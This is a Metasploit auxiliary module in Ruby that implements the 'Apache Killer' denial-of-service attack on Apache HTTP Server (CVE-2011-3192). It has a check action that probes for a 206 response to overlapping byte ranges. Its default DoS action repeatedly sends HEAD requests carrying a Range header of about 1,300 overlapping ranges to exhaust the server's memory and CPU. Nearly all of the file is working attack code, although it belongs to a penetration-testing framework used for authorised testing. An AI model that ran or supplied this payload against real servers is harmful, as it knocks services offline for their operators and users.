##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::WmapScanFile
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Apache Range header DoS (Apache Killer)',
			'Description'    => %q{
					The byterange filter in the Apache HTTP Server 2.0.x through 2.0.64, and 2.2.x
				through 2.2.19 allows remote attackers to cause a denial of service (memory and
				CPU consumption) via a Range header that expresses multiple overlapping ranges,
				exploit called "Apache Killer"
			},
			'Author'         =>
				[
					'Kingcope', #original discoverer
					'Masashi Fujiwara', #metasploit module
					'Markus Neis <markus.neis[at]gmail.com>' # check for vulnerability
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'BID', '49303'],
					[ 'CVE', '2011-3192'],
					[ 'EDB', '17696'],
					[ 'OSVDB', '74721' ],
				],
			'DisclosureDate' => 'Aug 19 2011',

		'Actions'  =>
			[
				['DOS'],
				['CHECK']
			],
		'DefaultAction' => 'DOS'

		))

		register_options(
			[
				Opt::RPORT(80),
				OptString.new('URI', [ true,  "The request URI", '/']),
				OptInt.new('RLIMIT', [ true,  "Number of requests to send",50]),
				OptString.new('ACTION', [true, "DOS or CHECK", "DOS"])
			], self.class)
	end

	def run_host(ip)

	case action.name

	when 'DOS'
		conduct_dos()

	when 'CHECK'
		check_for_dos()
	end

	end

	def check_for_dos()
		path = datastore['URI']
			begin
				res = send_request_cgi({
										'uri'           =>  path,
										'method'        => 'HEAD',
										'headers'       => { "HOST" => "Localhost", "Request-Range" => "bytes=5-0,1-1,2-2,3-3,4-4,5-5,6-6,7-7,8-8,9-9,10-10"} })

				if (res and res.code == 206)
					print_status("Response was #{res.code}")
					print_status("Found Byte-Range Header DOS at #{path}")


				report_note(
					:host   => rhost,
					:port   => rport,
					:data   => "Apache Byte-Range DOS at #{path}"

				)

				else
					print_status("NADA")
			
				end


			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			rescue ::Timeout::Error, ::Errno::EPIPE
	end


	end


	def conduct_dos()
		uri = datastore['URI']
		ranges = ''
		for i in (0..1299) do
			ranges += ",5-" + i.to_s
		end
		for x in 1..datastore['RLIMIT']
			begin
				connect
				print_status("Sending DoS packet #{x} to #{rhost}:#{rport}")

				sploit = "HEAD " + uri + " HTTP/1.1\r\n"
				sploit << "Host: " + rhost + "\r\n"
				sploit << "Range: bytes=0-" + ranges + "\r\n"
				sploit << "Accept-Encoding: gzip\r\n"
				sploit << "Connection: close\r\n\r\n"

				sock.put(sploit)
				disconnect
			rescue ::Rex::ConnectionRefused
				print_status("Unable to connect to #{rhost}:#{rport}.")
			rescue ::Errno::ECONNRESET
				print_status("DoS packet successful. #{rhost} not responding.")
			rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
				print_status("Couldn't connect to #{rhost}:#{rport}")
			rescue ::Timeout::Error, ::Errno::EPIPE
			end
		end
	end
end
